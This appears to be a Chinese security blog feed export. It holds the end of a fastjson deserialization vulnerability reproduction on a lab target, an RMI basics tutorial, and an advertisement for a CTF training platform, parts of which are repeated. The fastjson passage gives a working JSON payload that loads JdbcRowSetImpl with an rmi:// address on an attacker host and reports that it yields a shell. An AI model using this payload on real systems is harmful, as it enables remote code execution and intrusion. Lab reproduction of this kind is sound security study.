<p>开启之后，访问<code>http://开启靶机的ip地址:8090</code>即可访问靶机页面</p>
<blockquote>
<p>上面的步骤几乎一样，这里就跳过了</p>
</blockquote>
<p>只需要在修改包的时候把构造的数据修改成下面的数据即可：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">168</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.32.136:9999/Shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>发送成功后，监听的端口依然能够getshell：</p>
<p><img src="image-20230713182328478.png" alt="image-20230713182328478"></p>
<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>本文参考文章：</p>
<ul>
<li><p><a href="https://juejin.cn/post/6846687594130964488">https://juejin.cn/post/6846687594130964488</a></p>
</li>
<li><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
</li>
</ul>
<p>不同版本fastjson的绕过利用文章(写的很详细)：</p>
<ul>
<li><a href="https://www.freebuf.com/vuls/361576.html">https://www.freebuf.com/vuls/361576.html</a></li>
</ul>
]]></content>
      <categories>
        <category>stcs</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>红队</tag>
        <tag>fastjson</tag>
        <tag>Java漏洞</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI反序列化</title>
    <url>/stcs/2023/07/3146666c304a/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。</p>
<p>所以，得先弄清楚RMI等前置知识点再复现fastjson的漏洞，这样能帮助我们更好的理解fastjson漏洞的原理。</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>RMI(远程方法调用，Remote Method Invocation)，在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。它大大增强了Java开发分布式应用的效率，它是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
<p>Java本身对RMI规范的实现默认是使用JRMP协议，而在Weblogic中对RMI规范的实现使用的是T3协议。</p>
<blockquote>
<p>JRMP: Java Remote Message Protocol，Java远程消息交换协议。在Java中， 使用Java调用远程的Java程序就是RMI来进行操作的。</p>
<p>T3协议：它是Weblogic里面独有的一个协议，在前面写的一篇关于RMI的文章里面提到过RMI的传输过程是传输的序列化数据，而在接收后会进行一个反序列化的操作。在Weblogic中对RMI规范的实现使用T3协议。而在T3的传输过程也是一样的。</p>
</blockquote>
<p>在开发中，RMI分为三大部分，分别为：<mark class="hl-label blue">**Server**(服务器端)</mark>、<mark class="hl-label blue">**Client**(客户端)</mark>和<mark class="hl-label blue">**Registry**(注册表)</mark>。在下面的表格中会有具体的信息：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Server</td>
<td align="center">提供远程的对象</td>
</tr>
<tr>
<td align="center">Client</td>
<td align="center">调用远程的对象</td>
</tr>
<tr>
<td align="center">Registry</td>
<td align="center">存放着远程对象的位置（ip、端口、标识符）的注册表</td>
</tr>
</tbody></table>
<p>接下来是具体的用例。</p>
<h2 id="RMI的基础运用"><a href="#RMI的基础运用" class="headerlink" title="RMI的基础运用"></a>RMI的基础运用</h2><p>在上文中可以知道，RMI可以调用远程的Java对象进行本地执行。</p>
<h3 id="服务器端实现"><a href="#服务器端实现" class="headerlink" title="服务器端实现"></a>服务器端实现</h3><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">接口代码</button><button type="button" class="tab">接口实现类</button><button type="button" class="tab">服务端代码</button></div><div class="tab-contents"><div class="tab-item-content active"><p>远程被调用的类必须继承<mark class="hl-label blue">java.rmi.Remote</mark>接口才能使用。下面是具体的代码用例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RmiTest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line"><span class="comment">//    这里需要抛出RemoteException的异常</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：在定义远程接口时，修饰符必须是<code>public</code>，否则会报错；并且需要抛出RemoteException的异常。</p>
</blockquote></div><div class="tab-item-content"><p>在编写实现类的时候，实现类需要继承<mark class="hl-label blue"><strong>UnicastRemoteObject</strong></mark>类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server.Impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiTestImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RmiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RmiTestImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是服务端的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在调用远程的方法：test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test方法调用成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：这里必须编写实现类的构造方法，否则会报错</p>
</blockquote></div><div class="tab-item-content"><p>现在需要创建一个服务器的实例，并且创建一个注册表，将需要提供给客户端的对象注册上去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.server.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.Impl.RmiTestImpl;</span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"><span class="comment">//        创建服务器对象</span></span><br><span class="line">        <span class="type">RmiTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RmiTestImpl</span>();</span><br><span class="line"><span class="comment">//        创建注册表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line"><span class="comment">//        将服务器对象注册到注册表里</span></span><br><span class="line">        reg.rebind(<span class="string">&quot;test&quot;</span>, test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>



<h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>下面是一个基础的客户端的实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lxc.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lxc.server.RmiTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line"><span class="comment">//        创建注册表对象，并读取服务端写入注册表的内容</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">6666</span>);</span><br><span class="line"><span class="comment">//        利用注册表中的代理去查询注册表中名为test的对象</span></span><br><span class="line">        <span class="type">RmiTest</span> <span class="variable">rmiTest</span> <span class="operator">=</span> (RmiTest) reg.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//        调用方法</span></span><br><span class="line">        System.out.println(rmiTest.test());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。</p>
</blockquote>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">服务端运行</button><button type="button" class="tab">客户端运行</button></div><div class="tab-contents"><div class="tab-item-content active"><p>首先运行服务器端的代码，启动成功之后输出结果如下：</p>
<p><img src="image-20230703150831399.png" alt="image-20230703150831399"></p></div><div class="tab-item-content"><p>接下来运行客户端的代码，运行成功之后结果如下：</p>
<p><img src="image-20230703150925484.png" alt="image-20230703150925484"></p>
<!--tab 服务器运行-->

<!--tab 客户端回显-->

<p>此时服务器端应该显示下面的内容：</p>
<p><img src="image-20230703150953147.png" alt="image-20230703150953147"></p>
<p>这样就表示运行成功了。</p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>



<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><blockquote>
<p>因作者能力有限，rmi攻击可以查看下面的文章：</p>
<p><a href="https://xz.aliyun.com/t/8706">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析 - 先知社区 (aliyun.com)</a></p>
</blockquote>
<blockquote>
<p>本文参考文章：</p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>stcs</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>红队</tag>
        <tag>Java漏洞</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>云淇火翎网络安全攻防平台</title>
    <url>/products/2025/05/eb16ed253297/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你还在为培训没有比赛平台而困扰吗？你还在为市面开源的平台过于简陋、功能稀缺而困扰吗？或许，云淇火翎网络安全综合攻防竞赛平台可以给你答案！</p>
<h1 id="靶场的特点和功能"><a href="#靶场的特点和功能" class="headerlink" title="靶场的特点和功能"></a>靶场的特点和功能</h1><p>云淇火翎网络安全综合竞赛平台是一个综合性的平台，包含了平台靶场搭建、网络对抗环境、内置题库、培训服务等多个方面，云淇火翎安全靶场提供的服务可以让用户更好地了解网络安全攻防知识，提高信息安全意识，提高自我保护能力，催生网络安全领域新的人才。</p>
<p>云淇火翎网络安全综合竞赛平台拥有最接近实战的攻防环境（来自BugScan社区的漏洞插件、来自安全服务团队的渗透经验），10年专家级渗透测试经验分析，7000+的漏洞素材。</p>
<p>丰富的CTF出题经验与题目环境（成功举办历届攻防比赛、平台基本包括出现过的CTF的题目环境），1000+网络安全基题库，300+CTF题目。</p>
<p>可构建符合业务需求的仿真环境（网络拓扑环境＋网络业务仿真），10+攻防大赛的决赛环境，20+各类业务系统仿真</p>
<p>补：所涵盖课程及靶场题库根据业内赛事及最新漏洞实时更新环境。</p>
<h2 id="功能列表"><a href="#功能列表" class="headerlink" title="功能列表"></a>功能列表</h2><h3 id="CTF，夺旗赛训练"><a href="#CTF，夺旗赛训练" class="headerlink" title="CTF，夺旗赛训练"></a>CTF，夺旗赛训练</h3><p>* 靶场练习：它提供了各种不同类型的靶场练习，如web、二进制、逆向、密码破解、网络取证、漏洞利用等，用户可以选择适合自己的练习类型，进行实践演练。</p>
<p>* 竞赛模式：它支持单人、团队、对抗等多种竞赛模式，用户可以在进行实战训练的同时，学习竞赛经验，提升自己的实战能力。</p>
<p>* 自定义练习：用户可以选择自己喜欢的练习题目进行练习，并可以根据自己的需要进行自定义调整，提高练习的效率和成果。</p>
<p>* 难度递进：靶场练习的难度从简单到复杂，有着递进式的增加，帮助用户逐渐提升自己的技能水平。</p>
<p>* 实时评估：它支持实时评估，用户可以在练习过程中得到实时的反馈和评估，帮助用户及时调整自己的操作方式。</p>
<h3 id="CTF，夺旗赛比赛"><a href="#CTF，夺旗赛比赛" class="headerlink" title="CTF，夺旗赛比赛"></a>CTF，夺旗赛比赛</h3><p>* 竞赛模式：它支持个人赛、团队赛和对抗赛等多种竞赛模式，参赛者可以根据自己的喜好和实际需求选择不同的比赛形式。</p>
<p>* 靶场挑战：它提供了各种具有挑战性的网络攻防场景，参赛者需要通过分析漏洞，利用漏洞，获取旗帜等方式来完成任务，切实提高参赛者的实战能力。</p>
<p>* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。</p>
<p>* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式、出题数量等等，以适应不同场合和不同需求的比赛。</p>
<p>* 安全可靠：比赛靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。</p>
<h3 id="AWD，攻防兼备"><a href="#AWD，攻防兼备" class="headerlink" title="AWD，攻防兼备"></a>AWD，攻防兼备</h3><p>* 攻防并重：AWD攻防兼备靶场是一个攻防并重的平台，它要求参赛者既要具有攻击能力，又要具有防守能力，这样可以更好地锻炼参赛者的技能，同时也可以让参赛者全面了解网络安全的各个方面。</p>
<p>* 多种攻击方式：AWD攻防兼备靶场支持多种攻击方式，如web渗透、二进制漏洞、移动设备漏洞等等，这些攻击方式都非常具有挑战性，需要参赛者掌握多种技术才能成功。</p>
<p>* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。</p>
<p>* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式等等，以适应不同场合和不同需求的比赛。</p>
<p>* 安全可靠：AWD攻防兼备靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。</p>
<h3 id="后台管理"><a href="#后台管理" class="headerlink" title="后台管理"></a>后台管理</h3><p>* 用户管理：可以创建和管理用户账户，并设置对应的权限和角色。</p>
<p>* 数据统计：可以对网站的流量、用户活动、订单等数据进行实时监控和分析，以便更好地了解业务情况和做出决策。</p>
<p>* 内容管理：可以添加、编辑和删除网站的各种内容，包括文章、图片、视频等，并对其进行分类和标签管理。</p>
<h3 id="态势展示功能"><a href="#态势展示功能" class="headerlink" title="态势展示功能"></a>态势展示功能</h3><p>比赛过程中通过态势展现的形式向观众展示比赛的全部过程，包括基础理论、夺旗闯关、主机渗透、攻防对抗、取证溯源、企业环境渗透、安全加固、自定义竞赛八种不同模式的态势展示，每中模式都会显示各阶段中各队的答题情况以及分数和排行，方便观众及时了解竞赛的战况。</p>
<h2 id="功能指标"><a href="#功能指标" class="headerlink" title="功能指标"></a>功能指标</h2><h3 id="CTF（Capture-The-Flag夺旗赛）"><a href="#CTF（Capture-The-Flag夺旗赛）" class="headerlink" title="CTF（Capture The Flag夺旗赛）"></a>CTF（Capture The Flag夺旗赛）</h3><h4 id="动态分值"><a href="#动态分值" class="headerlink" title="动态分值"></a>动态分值</h4><p>分数随着做出的人越多越低，并且也会降低之前已经做出该题的人的分数</p>
<h4 id="个人数据统计"><a href="#个人数据统计" class="headerlink" title="个人数据统计"></a>个人数据统计</h4><h4 id="排行分析"><a href="#排行分析" class="headerlink" title="排行分析"></a>排行分析</h4><h4 id="统计选手擅长的方向和题目标签类型"><a href="#统计选手擅长的方向和题目标签类型" class="headerlink" title="统计选手擅长的方向和题目标签类型"></a>统计选手擅长的方向和题目标签类型</h4><h1 id="靶场的特点和功能-1"><a href="#靶场的特点和功能-1" class="headerlink" title="靶场的特点和功能"></a>靶场的特点和功能</h1><p>云淇火翎网络安全综合竞赛平台是一个综合性的平台，包含了平台靶场搭建、网络对抗环境、内置题库、培训服务等多个方面，云淇火翎安全靶场提供的服务可以让用户更好地了解网络安全攻防知识，提高信息安全意识，提高自我保护能力，催生网络安全领域新的人才。</p>
<p>云淇火翎网络安全综合竞赛平台拥有最接近实战的攻防环境（来自BugScan社区的漏洞插件、来自安全服务团队的渗透经验），10年专家级渗透测试经验分析，7000+的漏洞素材。</p>
<p>丰富的CTF出题经验与题目环境（成功举办历届攻防比赛、平台基本包括出现过的CTF的题目环境），1000+网络安全基题库，300+CTF题目。</p>
<p>可构建符合业务需求的仿真环境（网络拓扑环境＋网络业务仿真），10+攻防大赛的决赛环境，20+各类业务系统仿真</p>
<p>补：所涵盖课程及靶场题库根据业内赛事及最新漏洞实时更新环境。</p>
<h2 id="功能列表-1"><a href="#功能列表-1" class="headerlink" title="功能列表"></a>功能列表</h2><h3 id="CTF，夺旗赛训练-1"><a href="#CTF，夺旗赛训练-1" class="headerlink" title="CTF，夺旗赛训练"></a>CTF，夺旗赛训练</h3><p>* 靶场练习：它提供了各种不同类型的靶场练习，如web、二进制、逆向、密码破解、网络取证、漏洞利用等，用户可以选择适合自己的练习类型，进行实践演练。</p>
<p>* 竞赛模式：它支持单人、团队、对抗等多种竞赛模式，用户可以在进行实战训练的同时，学习竞赛经验，提升自己的实战能力。</p>
<p>* 自定义练习：用户可以选择自己喜欢的练习题目进行练习，并可以根据自己的需要进行自定义调整，提高练习的效率和成果。</p>
<p>* 难度递进：靶场练习的难度从简单到复杂，有着递进式的增加，帮助用户逐渐提升自己的技能水平。</p>
<p>* 实时评估：它支持实时评估，用户可以在练习过程中得到实时的反馈和评估，帮助用户及时调整自己的操作方式。</p>
<h3 id="CTF，夺旗赛比赛-1"><a href="#CTF，夺旗赛比赛-1" class="headerlink" title="CTF，夺旗赛比赛"></a>CTF，夺旗赛比赛</h3><p>* 竞赛模式：它支持个人赛、团队赛和对抗赛等多种竞赛模式，参赛者可以根据自己的喜好和实际需求选择不同的比赛形式。</p>
<p>* 靶场挑战：它提供了各种具有挑战性的网络攻防场景，参赛者需要通过分析漏洞，利用漏洞，获取旗帜等方式来完成任务，切实提高参赛者的实战能力。</p>
<p>* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。</p>
<p>* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式、出题数量等等，以适应不同场合和不同需求的比赛。</p>
<p>* 安全可靠：比赛靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。</p>
<h3 id="AWD，攻防兼备-1"><a href="#AWD，攻防兼备-1" class="headerlink" title="AWD，攻防兼备"></a>AWD，攻防兼备</h3><p>* 攻防并重：AWD攻防兼备靶场是一个攻防并重的平台，它要求参赛者既要具有攻击能力，又要具有防守能力，这样可以更好地锻炼参赛者的技能，同时也可以让参赛者全面了解网络安全的各个方面。</p>
<p>* 多种攻击方式：AWD攻防兼备靶场支持多种攻击方式，如web渗透、二进制漏洞、移动设备漏洞等等，这些攻击方式都非常具有挑战性，需要参赛者掌握多种技术才能成功。</p>
<p>* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。</p>
<p>* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式等等，以适应不同场合和不同需求的比赛。</p>
<p>* 安全可靠：AWD攻防兼备靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。</p>
<h3 id="后台管理-1"><a href="#后台管理-1" class="headerlink" title="后台管理"></a>后台管理</h3><p>* 用户管理：可以创建和管理用户账户，并设置对应的权限和角色。</p>
<p>* 数据统计：可以对网站的流量、用户活动、订单等数据进行实时监控和分析，以便更好地了解业务情况和做出决策。</p>
<p>* 内容管理：可以添加、编辑和删除网站的各种内容，包括文章、图片、视频等，并对其进行分类和标签管理。</p>
<h3 id="态势展示功能-1"><a href="#态势展示功能-1" class="headerlink" title="态势展示功能"></a>态势展示功能</h3><p>比赛过程中通过态势展现的形式向观众展示比赛的全部过程，包括基础理论、夺旗闯关、主机渗透、攻防对抗、取证溯源、企业环境渗透、安全加固、自定义竞赛八种不同模式的态势展示，每中模式都会显示各阶段中各队的答题情况以及分数和排行，方便观众及时了解竞赛的战况。</p>
<h2 id="功能指标-1"><a href="#功能指标-1" class="headerlink" title="功能指标"></a>功能指标</h2><h3 id="CTF（Capture-The-Flag夺旗赛）-1"><a href="#CTF（Capture-The-Flag夺旗赛）-1" class="headerlink" title="CTF（Capture The Flag夺旗赛）"></a>CTF（Capture The Flag夺旗赛）</h3><h4 id="动态分值-1"><a href="#动态分值-1" class="headerlink" title="动态分值"></a>动态分值</h4><p>分数随着做出的人越多越低，并且也会降低之前已经做出该题的人的分数</p>
<h4 id="个人数据统计-1"><a href="#个人数据统计-1" class="headerlink" title="个人数据统计"></a>个人数据统计</h4><p><img src="image-20250509005221978.png" alt="image-20250509005221978"></p>
<h4 id="排行分析-1"><a href="#排行分析-1" class="headerlink" title="排行分析"></a>排行分析</h4><p><img src="image-20250509005453219.png" alt="image-20250509005453219"></p>
<h4 id="竞赛公告"><a href="#竞赛公告" class="headerlink" title="竞赛公告"></a>竞赛公告</h4><p><img src="image-20250509005511314.png" alt="image-20250509005511314"></p>
<h4 id="对CTF的全方面支持"><a href="#对CTF的全方面支持" class="headerlink" title="对CTF的全方面支持"></a>对CTF的全方面支持</h4><p>选手端</p>
<p><img src="image-20250509005525030.png" alt="image-20250509005525030"></p>
<p>管理端</p>
<p><img src="image-20250509005534190.png" alt="image-20250509005534190"></p>
<h4 id="初始化靶机秘钥"><a href="#初始化靶机秘钥" class="headerlink" title="初始化靶机秘钥"></a>初始化靶机秘钥</h4><p>靶场中，参赛队伍可以提交找到的flag，获得相应的分数和排名。同时，管理员可以发布一些重要的公告，让参赛队伍及时了解比赛动态。还可以通过排名分析功能，对各个队伍的表现进行分析和比较，有助于发现问题和做出优化。另外，在队伍靶机管理模块中，管理员可以方便地设置和管理每个队伍所属的靶机资源。当队伍需要访问自己的靶机时，可以通过靶机远程登录功能进行操作。此外，初始化靶机秘钥可以方便地加密和保护靶机的数据安全性。</p>
<h4 id="态势大屏"><a href="#态势大屏" class="headerlink" title="态势大屏"></a>态势大屏</h4><p><img src="image-20250509005546544.png" alt="image-20250509005546544"></p>
<h4 id="靶场后台"><a href="#靶场后台" class="headerlink" title="靶场后台"></a>靶场后台</h4><p>可以对参赛队伍在比赛中的表现进行全面的监控和分析。管理员可以通过靶机攻击次数统计、攻破率统计等功能，追踪每个队伍的攻击情况和成功率，并加以评估和排名。同时，题目攻击分析和队伍正确率分析可以通过对队伍攻击数据的挖掘和展示，帮助管理员发现参赛队伍的弱点和优势，作出更有针对性的指导和建议。</p>
<p><img src="image-20250509005557977.png" alt="image-20250509005557977"></p>
<h4 id="题目管理"><a href="#题目管理" class="headerlink" title="题目管理"></a>题目管理</h4><p><img src="image-20250509005610935.png" alt="image-20250509005610935"></p>
<h4 id="选手数据分析"><a href="#选手数据分析" class="headerlink" title="选手数据分析"></a>选手数据分析</h4><p><img src="image-20250509005618025.png" alt="image-20250509005618025"></p>
<h4 id="管理页面"><a href="#管理页面" class="headerlink" title="管理页面"></a>管理页面</h4><p><img src="image-20250509005627698.png" alt="image-20250509005627698"></p>
<h4 id="多flag积分管理"><a href="#多flag积分管理" class="headerlink" title="多flag积分管理"></a>多flag积分管理</h4><h1 id="配套课程及服务"><a href="#配套课程及服务" class="headerlink" title="配套课程及服务"></a>配套课程及服务</h1><p>云淇火翎网络安全综合竞赛平台结合数字化转型提出新型网络安全体系建设的思路和方法，课程深入探讨此思路和方法在行业中的应用和实践，并将这样的理念贯穿课程设计体系。依照这样的思路和方法，学员将更加明确网络安全与信息化相融合的思路。</p>
<h2 id="靶场安全培训："><a href="#靶场安全培训：" class="headerlink" title="靶场安全培训："></a>靶场安全培训：</h2><p>针对顶尖安全专家与安全研究员提供的解决方案，我们将在建设项目移交给用户运行前对最终用户进行相关的技术培训，此外，每次的系统升级或者根据用户的要求，我们将提供不定期的技术培训服务。该类技术培训主要分为以下部分：</p>
<ol>
<li>系统管理用户培训：针对系统日常管理、维护、安装进行培训，培训对象为技术管理人员，内容为系统常见技术问题处理方式等。</li>
</ol>
<h2 id="优势对比"><a href="#优势对比" class="headerlink" title="优势对比"></a>优势对比</h2><table>
<thead>
<tr>
<th>功能</th>
<th>开源方案</th>
<th>现有企业方案</th>
<th>IrinaGame</th>
</tr>
</thead>
<tbody><tr>
<td>公共CTF靶场</td>
<td>静态部署</td>
<td>动态&#x2F;静态部署</td>
<td>动态&#x2F;静态部署</td>
</tr>
<tr>
<td>班级&#x2F;团队私有题库</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>教师在线自定义题目</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>公共CTF竞赛</td>
<td>非集成</td>
<td>非集成</td>
<td>√</td>
</tr>
<tr>
<td>公共AWD</td>
<td>一次性静态部署</td>
<td>非集成</td>
<td>√</td>
</tr>
<tr>
<td>内网渗透</td>
<td>×</td>
<td>静态化题目，非集成，配置繁琐</td>
<td>可视化自定义内网结构+内置50道内网题目</td>
</tr>
<tr>
<td>内网结构</td>
<td>×</td>
<td>编写docker compose，难以完成复杂网络搭建</td>
<td>16层内网+32台服务器的可视化拓扑编辑</td>
</tr>
<tr>
<td>班级&#x2F;团队私有渗透</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>教学模块</td>
<td>×</td>
<td>单独模块</td>
<td>由CTF实训模块赋能</td>
</tr>
<tr>
<td>班级&#x2F;团队私有课程</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>服务器配置</td>
<td>单机</td>
<td>大多采用单机，少数大型比赛采用k8s等开源方案</td>
<td>自研kisara分布式架构</td>
</tr>
<tr>
<td>OJ</td>
<td>非集成</td>
<td>非集成，大部分CTFer代码能力较弱，无非独立编写较复杂代码</td>
<td>√</td>
</tr>
<tr>
<td>社区环境</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
</tbody></table>
<h2 id="售后技术服务"><a href="#售后技术服务" class="headerlink" title="售后技术服务"></a>售后技术服务</h2><p>顶尖安全专家与安全研究员组建了一支专业的售后技术服务队伍，这支队伍包括网络工程师、安全工程师、系统工程师等，他们负责进行用户项目的现场实施，同时接受用户系统日常运行过程中的技术咨询和维护服务。顶尖安全专家与安全研究员的售后服务可以做到：</p>
<p>(1) 协助计划</p>
<p>在项目实施之前，售后（售前）技术服务人员向用户提供项目实施的前提条件，包含网络环境要求、软硬件要求等。</p>
<p>对于用户购买的硬件和软件，在设备到达安装现场之后，售后技术人员将协助用户进行设备的安装、调试及验收。</p>
<p>(2) 现场服务</p>
